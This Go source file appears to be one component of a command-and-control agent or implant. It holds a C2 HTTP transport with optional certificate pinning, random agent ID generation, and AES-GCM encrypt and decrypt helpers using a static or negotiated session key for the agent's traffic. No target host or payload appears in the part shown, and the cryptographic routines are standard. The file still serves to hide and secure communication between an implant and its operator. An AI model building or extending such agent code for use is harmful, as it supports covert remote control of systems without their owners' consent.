package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
)

func init() {
	if staticKeyHex == "" {
		STATIC_KEY = make([]byte, 32)
		rand.Read(STATIC_KEY)
	} else {
		var err error
		STATIC_KEY, err = hex.DecodeString(staticKeyHex)
		if err != nil || len(STATIC_KEY) != 32 {
			STATIC_KEY = make([]byte, 32)
			rand.Read(STATIC_KEY)
		}
	}

	if certPinHex != "" {
		CERT_PIN = certPinHex
	}

	C2_TRANSPORT = &http.Transport{
		TLSClientConfig: &tls.Config{
			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
				if CERT_PIN == "" {
					return nil
				}
				for _, raw := range rawCerts {
					digest := sha256.Sum256(raw)
					if hex.EncodeToString(digest[:]) == CERT_PIN {
						return nil
					}
				}
				return fmt.Errorf("cert pin mismatch")
			},
		},
	}
}

func generateAgentID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func EncryptStatic(text string) (string, error) {
	block, err := aes.NewCipher(STATIC_KEY)
	if err != nil {
		return "", err
	}
	return encryptCommon(text, block)
}

func DecryptStatic(cryptoText string) (string, error) {
	block, err := aes.NewCipher(STATIC_KEY)
	if err != nil {
		return "", err
	}
	return decryptCommon(cryptoText, block)
}

func Encrypt(text string) (string, error) {
	key := STATIC_KEY
	if len(SESSION_KEY) > 0 {
		key = SESSION_KEY
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	return encryptCommon(text, block)
}

func Decrypt(cryptoText string) (string, error) {
	key := STATIC_KEY
	if len(SESSION_KEY) > 0 {
		key = SESSION_KEY
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	return decryptCommon(cryptoText, block)
}

func encryptCommon(text string, block cipher.Block) (string, error) {
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, []byte(text), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decryptCommon(cryptoText string, block cipher.Block) (string, error) {
	data, err := base64.StdEncoding.DecodeString(cryptoText)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return "", fmt.Errorf("too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}
